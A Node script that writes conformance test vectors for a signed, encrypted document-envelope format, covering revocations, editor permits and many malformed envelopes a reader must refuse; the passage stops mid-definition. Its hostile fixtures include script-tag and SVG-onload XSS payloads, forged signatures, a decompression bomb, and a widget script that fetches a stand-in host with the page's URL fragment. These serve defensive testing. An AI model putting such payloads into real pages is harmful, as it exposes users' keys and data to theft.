// Writes the sample envelopes every language must open. What it wrote is kept, since another zlib squeezes the same words differently.
import { createHash, webcrypto } from "node:crypto";
import { readFileSync, writeFileSync } from "node:fs";
import { deflateRawSync } from "node:zlib";

const { subtle } = webcrypto;
const CONTRACT = readFileSync(new URL("../VERSION", import.meta.url), "utf8").trim();
const [MAJOR, MINOR] = CONTRACT.split(".").map(Number);
const LATER_MINOR = `${MAJOR}.${MINOR + 1}.0`;
const DRAFT_OF_THIS = `${CONTRACT.split("-")[0]}-draft.8`;
const words = (said) => new TextEncoder().encode(said);
const b64 = (bytes) => Buffer.from(bytes).toString("base64url");
const sha = (...pieces) => createHash("sha256").update(Buffer.concat(pieces)).digest();
const be8 = (number) => {
  const out = Buffer.alloc(8);
  out.writeBigUInt64BE(BigInt(number));
  return out;
};
const u32 = (number) => {
  const out = Buffer.alloc(4);
  out.writeUInt32BE(number);
  return out;
};

const filled = (byte) => Buffer.alloc(32, byte);
const LINK_KEY = filled(0x11);
// Every envelope has a head of its own, even here: under one key, a head used twice breaks the seal.
const HEADS = { main: filled(0x22), files: filled(0x23), other: filled(0x24), playing: filled(0x25) };
const SINCE = "2026-11-03T12:00:00Z";

const signer = async (seed) => {
  const pkcs8 = Buffer.concat([Buffer.from("302e020100300506032b657004220420", "hex"), seed]);
  const key = await subtle.importKey("pkcs8", pkcs8, "Ed25519", true, ["sign"]);
  const jwk = await subtle.exportKey("jwk", key);
  return { key, public: Buffer.from(jwk.x, "base64url") };
};
const root = await signer(filled(0x33));
const machine = await signer(filled(0x44));
const sign = async (who, ...pieces) => Buffer.from(await subtle.sign("Ed25519", who.key, Buffer.concat(pieces)));

const certificate = await sign(root, words("tisty-share.certificate.v1\0"), root.public, machine.public, be8(Date.parse(SINCE) / 1000));

const revocation = async (by, of, at) => ({
  root: b64(by.public),
  machine: b64(of.public),
  at,
  signed: b64(await sign(by, words("tisty-share.revocation.v1\0"), by.public, of.public, be8(Date.parse(at) / 1000))),
});
const revoked = await revocation(root, machine, SINCE);

async function mac(...pieces) {
  const key = await subtle.importKey("raw", LINK_KEY, { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
  return Buffer.from(await subtle.sign("HMAC", key, Buffer.concat(pieces)));
}

const nameTag = (id, name = "") => mac(words("tisty-owner-name\0"), be8(words(id).length), words(id), words(name));

const MARIO = { root, machine, certificate };

const ownerBlock = async ({ id, name, permit, tag, by = MARIO, forged }) => {
  const nameTagged = tag ?? (await nameTag(id, name));
  const about = words("owner");
  const said = [be8(words(id).length), words(id), permit?.public ?? filled(0), nameTagged];
  const signed = await sign(by.machine, words("tisty-share.signed.v1\0"), by.root.public, by.machine.public, be8(about.length), about, ...said);
  const vouched = forged === "certificate" ? await sign(by.root, words("otro")) : by.certificate;
  return {
    root: b64(by.root.public),
    machine: b64(by.machine.public),
    since: SINCE,
    certificate: b64(vouched),
    ...(permit ? { permit: b64(permit.public) } : {}),
    name_tag: b64(nameTagged),
    signed: b64(forged === "signed" ? await sign(by.machine, words("otro")) : signed),
  };
};

const permitSigned = (token, by, manifest, index) => sign(token, words("tisty-share.permit.v1\0"), by.root.public, by.machine.public, sha(manifest), index);

const seal = async ({ kind, id, version, sealed, parts, from, contract = CONTRACT, head = HEADS[kind], after = [], more = {}, spelled = (one) => one, forged, signatureBytes, owner, by = MARIO, token, permitBy = by, outerIsOwner, outerAsPermit, permitSignedBytes }) => {
  const told = parts.map(({ name, compressed, bytes, saying, junk = [], more }) => {
    const squeezed = compressed ? Buffer.concat([deflateRawSync(bytes, { level: 9 }), Buffer.from(junk)]) : bytes;
    return { name, compressed, squeezed, open_size: saying ?? bytes.length, sealed_size: squeezed.length + (sealed ? 16 : 0), more };
  });
  const opening = sealed ? { head: b64(head), commitment: b64(await hmac(head)) } : {};
  const manifest = words(
    spelled(JSON.stringify({
      contract,
      kind,
      id,
      version,
      ...(from === undefined ? {} : { from }),
      sealed,
      ...opening,
      ...(owner ? { owner } : {}),
      parts: told.map(({ name, compressed, sealed_size, open_size, more }) => ({ name, compressed, sealed_size, open_size, ...more })),
      ...more,
    })),
  );
  const key = sealed ? await envelopeKey(head) : undefined;
  const travelling = [];
  for (const [at, part] of told.entries()) {
    travelling.push(
      sealed
        ? Buffer.from(await subtle.encrypt({ name: "AES-GCM", iv: nonce(at), additionalData: manifest }, key, part.squeezed))
        : Buffer.from(part.squeezed),
    );
  }
  const index = Buffer.concat(travelling.map((one) => sha(one)));
  const about = words("envelope");
  const signed = await sign(by.machine, words("tisty-share.signed.v1\0"), by.root.public, by.machine.public, be8(about.length), about, sha(manifest), forged === "signed" ? words("otro") : index);
  const vouched = forged === "certificate" ? await sign(by.root, words("otro")) : by.certificate;
  const signature =
    signatureBytes ??
    words(
      JSON.stringify({
        root: b64(by.root.public),
        machine: b64(by.machine.public),
        since: SINCE,
        certificate: b64(vouched),
        signed: outerIsOwner ? owner.signed : b64(signed),
        ...(token ? { permit_signed: b64(await permitSigned(token, permitBy, manifest, index)) } : {}),
        ...(outerAsPermit ? { permit_signed: b64(signed) } : {}),
        ...(permitSignedBytes ? { permit_signed: b64(permitSignedBytes) } : {}),
      }),
    );
  const bytes = Buffer.concat([words("TENV"), u32(manifest.length), manifest, u32(signature.length), signature, index, ...travelling, ...after]);
  return { bytes, hash: b64(sha(manifest, index)) };
};

// Written only from the contract's words, so a reader that reads them gets the same.
function fingerprintOf(key) {
  const digest = sha(words("tisty-share.person.v1\0"), key);
  const digits = (BigInt(`0x${digest.subarray(0, 9).toString("hex")}`) >> 6n).toString().padStart(20, "0");
  return digits.match(/.{5}/g).join(" ");
}

const nonce = (at) => {
  const out = Buffer.alloc(12);
  out.writeUInt32BE(at, 8);
  return out;
};

async function hmac(head) {
  const key = await subtle.importKey("raw", LINK_KEY, { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
  return Buffer.from(await subtle.sign("HMAC", key, Buffer.concat([words("tisty-envelope-commit"), head])));
}

async function envelopeKey(head) {
  const base = await subtle.importKey("raw", LINK_KEY, "HKDF", false, ["deriveKey"]);
  return subtle.deriveKey({ name: "HKDF", hash: "SHA-256", salt: head, info: words("tisty-envelope-key") }, base, { name: "AES-GCM", length: 256 }, false, ["encrypt"]);
}

const textParts = ({ body, pages, ...first }) => [
  { name: "first", compressed: true, bytes: words(JSON.stringify(first)) },
  { name: "rest", compressed: true, bytes: words(JSON.stringify({ body, pages })) },
];

// A real picture, one pixel wide, so a reader that decodes what it receives opens it too.
const PICTURES = [Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M/wHwAEBgIApD5fRAAAAABJRU5ErkJggg==", "base64")];
const FILES = [words("%PDF-1.7 cartilla")];
const owner = await ownerBlock({ id: "k7Qm2xPa", name: "Mario" });
const files = await seal({
  kind: "files",
  id: "k7Qm2xPa",
  version: 1,
  sealed: true,
  owner,
  parts: FILES.map((bytes) => ({ name: "file", compressed: false, bytes })),
});

const whole = {
  id: "k7Qm2xPa",
  title: "Paseos",
  lang: "es",
  sheet: { paper: "letter", on: true, orientation: "landscape" },
  signed_as: "Mario",
  owner_name: "Mario",
  pictures: [{ at: 0, name: "picture-0.png", kind: "image/png", size: PICTURES[0].length, width: 1, height: 1 }],
  files: [{ at: 0, name: "cartilla.pdf", kind: "application/pdf", size: FILES[0].length }],
  files_hash: files.hash,
  html: '<h1 id="paseos">Paseos</h1><img src="tisty:picture/0" alt="Rina" width="1" height="1"><a href="tisty:page/1">Enero</a><a href="tisty:file/0">Cartilla</a>',
  body: "# Paseos\n\n![Rina](tisty:picture/0)\n",
  pages: [{ id: "p1", page_of: "k7Qm2xPa", at: 1, title: "Enero", html: '<h1 id="enero">Enero</h1>', body: "# Enero\n" }],
};
const main = await seal({
  kind: "main",
  id: "k7Qm2xPa",
  version: 1,
  sealed: true,
  owner,
  parts: [...textParts(whole), ...PICTURES.map((bytes) => ({ name: "picture", compressed: false, bytes }))],
});

const plain = { id: "wordsOnly", title: "Solo palabras", html: "<p>Hola</p>", body: "Hola\n" };
const open = await seal({ kind: "main", id: "wordsOnly", version: 1, sealed: false, parts: textParts(plain) });

// What a reader refuses by itself, each one well signed: a writer's word counts for nothing here.
const HOSTILE = "hostile";
const asWords = (first, rest) => [
  { name: "first", compressed: true, bytes: words(JSON.stringify(first)) },
  { name: "rest", compressed: true, bytes: words(JSON.stringify(rest)) },
];
const fair = { id: HOSTILE, html: "<p>a</p>" };
const fairRest = { body: "a" };
const aPicture = { at: 0, name: "picture-0.png", kind: "image/png", size: PICTURES[0].length, width: 1, height: 1 };
const asPicture = { name: "picture", compressed: false, bytes: PICTURES[0] };
const withHtml = (html) => asWords({ ...fair, html }, fairRest);
const page = { id: "p1", page_of: HOSTILE, at: 1, html: "<p>b</p>", body: "b" };
const CASES = [
  ["a rest that says what the first one said", { parts: asWords({ ...fair, title: "Paseos" }, { ...fairRest, title: "Otro" }) }],
  ["a rest that brings its own HTML", { parts: asWords(fair, { ...fairRest, html: "<p>otro</p>" }) }],
  ["a first that holds the body", { parts: asWords({ ...fair, body: "a" }, {}) }],
  ["another document inside", { parts: asWords({ ...fair, id: "otroDoc" }, fairRest) }],
  ["an owner, which only its signature says", { parts: asWords({ ...fair, owner: b64(root.public) }, fairRest) }],
  ["a field that left what travels", { parts: asWords({ ...fair, by: "Mario" }, fairRest) }],
  ["more pictures than it says", { parts: [...asWords(fair, fairRest), asPicture] }],
  ["fewer pictures than it says", { parts: asWords({ ...fair, pictures: [aPicture] }, fairRest) }],
  ["a picture in another place than it says", { parts: [...asWords({ ...fair, pictures: [{ ...aPicture, at: 1 }] }, fairRest), asPicture] }],
  ["a picture of another size than it says", { parts: [...asWords({ ...fair, pictures: [{ ...aPicture, size: 1 }] }, fairRest), asPicture] }],
  ["a picture that says it is compressed", { parts: [...asWords({ ...fair, pictures: [aPicture] }, fairRest), { ...asPicture, compressed: true }] }],
  ["its parts out of their order", { parts: asWords(fair, fairRest).reverse() }],
  ["a part that gives more than it says", { parts: [{ ...asWords(fair, fairRest)[0], saying: 3 }, asWords(fair, fairRest)[1]] }],
  ["a part that swells far past what it says", { parts: [{ name: "first", compressed: true, bytes: Buffer.alloc(16 * 1024 * 1024), saying: 10 }, asWords(fair, fairRest)[1]] }],
  ["a part that says more than any reader holds", { parts: [{ ...asWords(fair, fairRest)[0], saying: 2 ** 40 }, asWords(fair, fairRest)[1]] }],
  ["something after its parts", { parts: asWords(fair, fairRest), after: [Buffer.from([0])] }],
  ["a from that is not earlier", { parts: asWords(fair, fairRest), version: 2, from: 7 }],
  ["a from that is its own version", { parts: asWords(fair, fairRest), version: 2, from: 2 }],
  ["a newer major version", { parts: asWords(fair, fairRest), contract: "99.0.0" }],
  ["an older major version", { parts: asWords(fair, fairRest), contract: "0.9.0" }],
  ["a version that is none", { parts: asWords(fair, fairRest), contract: "paseos" }],
  ["a version with no minor", { parts: asWords(fair, fairRest), contract: "1" }],
  ["a minor that is no number", { parts: asWords(fair, fairRest), contract: "1.x.0" }],
  ["a minor with a sign", { parts: asWords(fair, fairRest), contract: "1.+2.0" }],
  ["a major with a zero before it", { parts: asWords(fair, fairRest), contract: "01.2.0" }],
  ["an owner_name where nothing answers for it", { parts: asWords({ ...fair, owner_name: "Mario" }, fairRest) }],
  ["a signature that does not hold", { parts: asWords(fair, fairRest), forged: "signed" }],
  ["a certificate that does not hold", { parts: asWords(fair, fairRest), forged: "certificate" }],
  ["a signature that cannot be read", { parts: asWords(fair, fairRest), signatureBytes: words("no es una firma") }],
  ["a draft of this version", { parts: asWords(fair, fairRest), contract: DRAFT_OF_THIS }],
  ["two pages out of their order", { parts: asWords(fair, { ...fairRest, pages: [{ ...page, at: 2 }, { ...page, id: "p2" }] }) }],
  ["two pages with one id", { parts: asWords(fair, { ...fairRest, pages: [page, { ...page, at: 2 }] }) }],
  ["a picture drawn at another size than its own", { parts: [...asWords({ ...fair, pictures: [aPicture], html: '<img src="tisty:picture/0" alt="a" width="900" height="1">' }, fairRest), asPicture] }],
  ["files without the hash that answers for them", { parts: asWords({ ...fair, files: [{ at: 0, name: "cartilla.pdf" }] }, fairRest) }],
  ["a hash without files", { parts: asWords({ ...fair, files_hash: files.hash }, fairRest) }],
  ["a picture that gives another size than its manifest says", { parts: [...asWords({ ...fair, pictures: [aPicture] }, fairRest), { ...asPicture, saying: 3 }] }],
  ["a script in its HTML", { parts: withHtml("<script>alert(1)</script>") }],
  ["a script in a page", { parts: asWords(fair, { ...fairRest, pages: [{ ...page, html: "<script>alert(1)</script>" }] }) }],
  ["a page of another document", { parts: asWords(fair, { ...fairRest, pages: [{ ...page, page_of: "otroDoc" }] }) }],
  ["two pages in one place", { parts: asWords(fair, { ...fairRest, pages: [page, { ...page, id: "p2" }] }) }],
  ["a page that is not there", { parts: withHtml('<a href="tisty:page/9">a</a>') }],
  ["a picture that is not there", { parts: withHtml('<img src="tisty:picture/3" alt="a" width="1" height="1">') }],
  ["a file that is not there", { parts: withHtml('<a href="tisty:file/0">a</a>') }],
  ["a document that is not cited", { parts: withHtml('<a href="tisty:cited/0">a</a>') }],
  ["a reference hidden past a slash", { parts: withHtml('<a title/href=tisty:page/9>a</a>') }],
  ["a reference in a page to what its document does not hold", { parts: asWords(fair, { ...fairRest, pages: [{ ...page, html: '<a href="tisty:picture/0">a</a>' }] }) }],
];
const refused = [];
for (const [says, { parts, ...over }] of CASES) {
  const { bytes } = await seal({ kind: "main", id: HOSTILE, version: 1, sealed: false, parts, ...over });
  refused.push({ says, envelope: bytes.toString("hex") });
}

// What a reader opens all the same: a later minor of its major, and a number is a number however it is written.
const OPENING = [
  ["a later minor version", { parts: asWords(fair, fairRest), contract: LATER_MINOR }],
  [
    "fields it does not know, wherever they are",
    {
      contract: LATER_MINOR,
      more: { novel: "x" },
      parts: [
        { ...asWords({ ...fair, novel: "x", sheet: { paper: "a5", orientation: "diagonal", novel: 1 } }, fairRest)[0], more: { novel: 1 } },
        asWords(fair, { ...fairRest, pages: [{ ...page, novel: "x" }] })[1],
      ],
    },
  ],
  ["a rest that brings a field it does not know", { parts: asWords(fair, { ...fairRest, novel: 1 }) }],
  ["numbers written with a point", { parts: asWords(fair, { ...fairRest, pages: [{ ...page, at: 1 }] }), spelled: (one) => one.replace(/"(open_size|sealed_size|version)":(\d+)/g, '"$1":$2.0') }],
];
const opening = [];
for (const [says, { parts, ...over }] of OPENING) {
  const { bytes } = await seal({ kind: "main", id: HOSTILE, version: 1, sealed: false, parts, ...over });
  opening.push({ says, envelope: bytes.toString("hex") });
}
const pastItsEnd = await seal({ kind: "main", id: HOSTILE, version: 1, sealed: false, parts: [{ ...asWords(fair, fairRest)[0], junk: [1, 2, 3] }, asWords(fair, fairRest)[1]] });
const aNewerMajor = await seal({ kind: "main", id: HOSTILE, version: 1, sealed: false, contract: "2.0.0", parts: [{ name: "fonts", compressed: false, bytes: words("x") }] });

// A main envelope that answers for another files envelope than the one it is handed.
const otherFiles = await seal({ kind: "files", id: "k7Qm2xPa", version: 1, sealed: true, owner, head: HEADS.other, parts: [{ name: "file", compressed: false, bytes: words("otro") }] });
const moreFiles = await seal({ kind: "files", id: HOSTILE, version: 1, sealed: false, parts: [...FILES, ...FILES].map((bytes) => ({ name: "file", compressed: false, bytes })) });
const compressedFile = await seal({ kind: "files", id: HOSTILE, version: 1, sealed: false, parts: [{ name: "file", compressed: true, bytes: FILES[0] }] });
const aFile = { at: 0, name: "cartilla.pdf", kind: "application/pdf", size: FILES[0].length };
const inOtherPlace = await seal({ kind: "files", id: HOSTILE, version: 1, sealed: false, parts: [{ name: "file", compressed: false, bytes: FILES[0] }] });
const countedOver = { id: HOSTILE, html: "<p>a</p>", body: "a", files: [aFile], files_hash: moreFiles.hash };
const squeezedOver = { id: HOSTILE, html: "<p>a</p>", body: "a", files: [aFile], files_hash: compressedFile.hash };

const stranger = await signer(filled(0x55));
const BEFORE = "2026-11-04T00:00:00Z";
const AT = "2026-11-05T00:00:00Z";
const AFTER = "2026-11-06T00:00:00Z";
const broken = { ...(await revocation(root, machine, AT)), at: AFTER };
const verdicts = [
  { says: "no revocation names it", served: { received: AFTER }, verdict: "holds" },
  { says: "the server says nothing and names no revocation", served: {}, verdict: "holds" },
  { says: "it arrived before the revocation's at", served: { received: BEFORE, revocations: [await revocation(root, machine, AT)] }, verdict: "retired" },
  { says: "it arrived exactly at it, which counts as after", served: { received: AT, revocations: [await revocation(root, machine, AT)] }, verdict: "doubtful" },
  { says: "it arrived after it", served: { received: AFTER, revocations: [await revocation(root, machine, AT)] }, verdict: "doubtful" },
  { says: "the server does not say when it arrived", served: { revocations: [await revocation(root, machine, AT)] }, verdict: "doubtful" },
  { says: "of several, the earliest counts", served: { received: AT, revocations: [await revocation(root, machine, AFTER), await revocation(root, machine, BEFORE)] }, verdict: "doubtful" },
  { says: "a revocation of another machine counts for nothing", served: { received: AFTER, revocations: [await revocation(root, stranger, AT)] }, verdict: "holds" },
  { says: "a revocation by another root counts for nothing", served: { received: AFTER, revocations: [{ ...(await revocation(stranger, machine, AT)) }] }, verdict: "holds" },
  { says: "a revocation whose signature does not hold counts for nothing", served: { received: AFTER, revocations: [broken] }, verdict: "holds" },
];

// Who may sign a version: its owner, or whoever holds the token its owner allowed. Every attack here was made without the key unless it says otherwise.
const EDITED = "editado";
const person = async (rootByte, machineByte) => {
  const of = { root: await signer(filled(rootByte)), machine: await signer(filled(machineByte)) };
  of.certificate = await sign(of.root, words("tisty-share.certificate.v1\0"), of.root.public, of.machine.public, be8(Date.parse(SINCE) / 1000));
  return of;
};
const ANA = await person(0x66, 0x67);
const ZORRO = await person(0x68, 0x69);
const TOKEN = filled(0x70);
const permit = await signer(TOKEN);
const OLD_TOKEN = filled(0x71);
const oldPermit = await signer(OLD_TOKEN);
const edited = { id: EDITED, owner_name: "Mario", signed_as: "Ana", html: "<p>a</p>", body: "a" };
const asMario = { ...edited, signed_as: "Mario" };
const withPermit = await ownerBlock({ id: EDITED, name: "Mario", permit });
const withoutPermit = await ownerBlock({ id: EDITED, name: "Mario" });
let nextHead = 0x80;
const asEdited = (over, held = edited) => seal({ kind: "main", id: EDITED, version: 2, from: 1, sealed: true, owner: withPermit, by: ANA, head: filled(nextHead++), parts: textParts(held), ...over });
const opensForEditing = [
  { says: "its owner, who lets nobody edit", signer: b64(root.public), envelope: await asEdited({ owner: withoutPermit, by: MARIO }, asMario) },
  { says: "its owner, who lets someone edit, with no token of its own", signer: b64(root.public), envelope: await asEdited({ by: MARIO }, asMario) },
  { says: "an editor, under its own root, with the token", signer: b64(ANA.root.public), envelope: await asEdited({ token: permit }) },
];
const anas = await asEdited({ token: permit });
const swapManifest = (bytes, change, signed) => {
  const size = bytes.readUInt32BE(4);
  const manifest = JSON.parse(bytes.subarray(8, 8 + size).toString());
  const held = bytes.subarray(8 + size);
  const signatureSize = held.readUInt32BE(0);
  return signed(words(JSON.stringify(change(manifest))), held.subarray(4 + signatureSize));
};
const wrapped = async (bytes, by, tag) => {
  const theirs = await ownerBlock({ id: EDITED, name: "Zorro", permit, by, tag });
  return swapManifest(bytes, (manifest) => ({ ...manifest, owner: theirs }), async (manifest, rest) => {
    const index = rest.subarray(0, 64);
    const about = words("envelope");
    const signed = await sign(by.machine, words("tisty-share.signed.v1\0"), by.root.public, by.machine.public, be8(about.length), about, sha(manifest), index);
    const signature = words(JSON.stringify({ root: b64(by.root.public), machine: b64(by.machine.public), since: SINCE, certificate: b64(by.certificate), signed: b64(signed) }));
    return { bytes: Buffer.concat([words("TENV"), u32(manifest.length), manifest, u32(signature.length), signature, rest]) };
  });
};
const SMALL = { public: Buffer.concat([Buffer.from([1]), Buffer.alloc(31)]) };
const refusedForEditing = [
  ["someone else's owner wrapped around it, without the key", await wrapped(anas.bytes, ZORRO, filled(0x72))],
  ["another root where nobody may edit", await asEdited({ owner: withoutPermit, by: ZORRO }), "server"],
  ["another root that brings no token", await asEdited({ by: ZORRO }), "server"],
  ["a token its owner no longer allows", await asEdited({ token: oldPermit }), "server"],
  ["a token that signed for someone else, its signature changed for another", await asEdited({ by: ZORRO, token: permit, permitBy: ANA }), "server"],
  ["an owner that signed another document", await asEdited({ owner: await ownerBlock({ id: "otroDoc", name: "Mario", permit }) }), "server"],
  ["its owner's signature that does not hold", await asEdited({ owner: await ownerBlock({ id: EDITED, name: "Mario", permit, forged: "signed" }), by: MARIO }, asMario), "server"],
  ["its owner's certificate that does not hold", await asEdited({ owner: await ownerBlock({ id: EDITED, name: "Mario", permit, forged: "certificate" }), by: MARIO }, asMario), "server"],
  ["a permit of small order, which answers for anything", await asEdited({ owner: await ownerBlock({ id: EDITED, name: "Mario", permit: SMALL }), permitSignedBytes: Buffer.concat([SMALL.public, Buffer.alloc(32)]) }), "server"],
  ["an owner_name its owner did not sign", await asEdited({ token: permit }, { ...edited, owner_name: "Zorro" })],
  ["an owner tied to another key", await asEdited({ owner: await ownerBlock({ id: EDITED, name: "Mario", permit, tag: filled(0x73) }), token: permit })],
  ["its owner's signature passed off as the envelope's", await asEdited({ by: MARIO, outerIsOwner: true }, asMario), "server"],
  ["a machine's signature passed off as the token's", await asEdited({ owner: await ownerBlock({ id: EDITED, name: "Mario", permit: ANA.machine }), outerAsPermit: true }), "server"],
  ["no owner at all", await asEdited({ owner: undefined, by: MARIO }, asMario), "server"],
];
const asHex = (one) => one.bytes.toString("hex");
const noNameBlock = await ownerBlock({ id: EDITED, permit });
const restSaysAName = await asEdited({ owner: noNameBlock, token: permit, parts: asWords({ id: EDITED, signed_as: "Ana", html: "<p>a</p>" }, { body: "a", owner_name: "Zorro", title: "Otro" }) });
const newerThanThis = [
  ["a tag this reader does not know", { parts: withHtml("<video></video>") }],
  ["a rule this reader would refuse", { parts: asWords({ ...fair, pictures: [aPicture] }, fairRest) }],
  ["a signature this reader would refuse", { parts: asWords(fair, fairRest), forged: "signed" }],
];
const newer = [];
for (const [says, over] of newerThanThis) {
  newer.push({ says, envelope: asHex(await seal({ kind: "main", id: HOSTILE, version: 1, sealed: false, contract: LATER_MINOR, ...over })) });
}
const beforeTheFirstShared = await asEdited({ owner: undefined, by: MARIO, contract: "1.1.0" }, asMario);
const WRITTEN = new URL("./vectors.json", import.meta.url);
const frozenBefore = JSON.parse(readFileSync(WRITTEN, "utf8")).frozen ?? {};
const moreUnderALaterMinor = await seal({ kind: "files", id: HOSTILE, version: 1, sealed: false, contract: LATER_MINOR, parts: [...FILES, ...FILES].map((bytes) => ({ name: "file", compressed: false, bytes })) });

const png = PICTURES[0];
const jpeg = Buffer.from("/9j/4AAQSkZJRgABAgAAAQABAAD/wAARCAABAAIDAREAAhEBAxEB/9sAQwAIBgYHBgUIBwcHCQkICgwUDQwLCwwZEhMPFB0aHx4dGhwcICQuJyAiLCMcHCg3KSwwMTQ0NB8nOT04MjwuMzQy/9sAQwEJCQkMCwwYDQ0YMiEcITIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwDk64z9KP/Z", "base64");
const asKind = (kind, bytes, width, height) => ({ kind, width, height, size: bytes.length, bytes: Buffer.from(bytes).toString("hex") });
const PNG = "image/png";
const JPEG = "image/jpeg";
const pictures = {
  hold: [asKind(PNG, png, 1, 1), asKind(JPEG, jpeg, 2, 1)],
  fail: [
    ["an SVG that says it is a PNG", asKind(PNG, words('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'), 1, 1)],
    ["a JPEG that says it is a PNG", asKind(PNG, jpeg, 2, 1)],
    ["a PNG that says it is a JPEG", asKind(JPEG, png, 1, 1)],
    ["a PNG of another size than it says", asKind(PNG, png, 2, 1)],
    ["a JPEG of another size than it says", asKind(JPEG, jpeg, 1, 2)],
    ["something after the end of a PNG", asKind(PNG, Buffer.concat([png, words("mas")]), 1, 1)],
    ["something after the end of a JPEG", asKind(JPEG, Buffer.concat([jpeg, words("mas")]), 2, 1)],
    ["a PNG cut short", asKind(PNG, png.subarray(0, png.length - 4), 1, 1)],
    ["a JPEG cut short", asKind(JPEG, jpeg.subarray(0, jpeg.length - 2), 2, 1)],
  ].map(([says, one]) => ({ says, ...one })),
};

const sample = (name) => readFileSync(new URL(`./samples/${name}`, import.meta.url));
const asciiHex = (said) => words(said).reduce((all, one) => all + one.toString(16).padStart(2, "0"), "");
const OGG_PAGE = "00".repeat(22);
const EBML_START = "1a45dfa3 9f 4286 81 01 42f7 81 01 42f2 81 04 42f3 81 08 4282";
const WIDGET_CODE = '<script>fetch("https://otro.example/?k="+top.location.hash)</script>';
const PLAYING = [
  { says: "a sound that plays", name: "rina.mp3", kind: "audio/mpeg", bytes: sample("rina.mp3"), is: { format: "mp3", player: "audio", type: "audio/mpeg" } },
  { says: "a video that plays", name: "paseo.mp4", kind: "video/mp4", bytes: sample("paseo.mp4"), is: { format: "mp4", player: "video", type: "video/mp4" } },
  { says: "a page dressed as a video, which its name and its kind do not make one", name: "paseo.mp4", kind: "video/mp4", bytes: words(`<!doctype html>${WIDGET_CODE}`), is: null },
  { says: "a video of a format no reader is asked to play", name: "paseo.mkv", kind: "video/mp4", bytes: Buffer.from(`${EBML_START} 88 ${asciiHex("matroska")}`.replaceAll(" ", ""), "hex"), is: null, may_join_later: true },
  { says: "a PDF, which is only ever downloaded, whatever it says", name: "rina.mp3", kind: "audio/mpeg", bytes: FILES[0], is: null },
  { says: "a sound named as a page, which plays by its bytes and its name holds back", name: "rina.html", kind: "text/html", bytes: sample("rina.mp3"), is: { format: "mp3", player: "audio", type: "audio/mpeg" }, held_back: true },
];
const playingFiles = await seal({ kind: "files", id: "k7Qm2xPa", version: 1, sealed: true, owner, head: HEADS.playing, parts: PLAYING.map(({ bytes }) => ({ name: "file", compressed: false, bytes })) });
const playing = {
  document: {
    id: "k7Qm2xPa",
    html: "<p>a</p>",
    body: "a",
    files: PLAYING.map(({ name, kind, bytes }, at) => ({ at, name, kind, size: bytes.length })),
    files_hash: playingFiles.hash,
  },
  files: playingFiles.bytes.toString("hex"),
  is: PLAYING.map(({ says, is, may_join_later, held_back }, at) => ({ at, says, is, ...(may_join_later ? { may_join_later } : {}), ...(held_back ? { held_back } : {}) })),
};
const firstBytes = [
  ["an MP3 with its tags", "494433040000", "mp3"],
  ["an MP3 with no tags", "fffb9064", "mp3"],
  ["an M4A", "0000001c 66747970 4d344120 00000200", "m4a"],
  ["a WAV", "52494646 80110000 57415645", "wav"],
  ["an Ogg with Vorbis", `4f676753 ${OGG_PAGE} 01 1e 01 766f72626973`, "ogg"],
  ["an Ogg with Opus", `4f676753 ${OGG_PAGE} 01 13 4f70757348656164`, "ogg"],
  ["a FLAC", "664c6143", "flac"],
  ["an AAC", "fff15c40", "aac"],
  ["an MP4", "00000020 66747970 69736f6d 00000200", "mp4"],
  ["an M4V", "00000020 66747970 4d345620 00000200", "mp4"],
  ["a WebM", `${EBML_START} 84 7765626d`, "webm"],
  ["a MOV", "00000014 66747970 71742020 00000200", "mov"],
  ["nothing at all", "", null],
  ["one byte of sync", "ff", null],
  ["a sync with no room for its frame", "fffb90", null],
  ["a text in UTF-16, whose mark looks like a sync", "fffe6100", null],
  ["a frame of another layer", "fffd9064", null],
  ["a frame of a version that does not exist", "ffeb9064", null],
  ["a frame of a bitrate that does not exist", "fffbf064", null],
  ["a frame of a rate that does not exist", "fffb9c64", null],
  ["tags of a version that does not exist", "494433ff0000", null],
  ["a Matroska", `${EBML_START} 88 ${asciiHex("matroska")}`, null],
  ["WebM said past its header", `1a45dfa3 ${"00".repeat(64)} 4282 84 7765626d`, null],
  ["an AVI", "52494646 80110000 41564920", null],
  ["an Ogg with Theora", `4f676753 ${OGG_PAGE} 01 2a 80 7468656f7261`, null],
  ["an Ogg cut before its first packet", "4f676753", null],
  ["a HEIC", "00000018 66747970 68656963 00000000", null],
  ["an AVIF", "0000001c 66747970 61766966 00000000", null],
  ["a box too small to name its brand", "00000008 66747970 69736f6d", null],
  ["a brand cut short", "00000020 66747970 6973", null],
  ["a list of segments on the web", asciiHex("#EXTM3U\n#EXTINF:1,\nhttps://a.example/a.ts\n"), null],
  ["a page", asciiHex("<!doctype html><script>x</script>"), null],
  ["a drawing", asciiHex('<svg xmlns="http://www.w3.org/2000/svg"/>'), null],
  ["a PDF", asciiHex("%PDF-1.7"), null],
  ["a program", "4d5a9000", null],
  ["a ZIP", "504b0304", null],
].map(([says, bytes, format]) => ({ says, bytes: bytes.replaceAll(" ", ""), format }));
const hostileWidget = {
  id: HOSTILE,
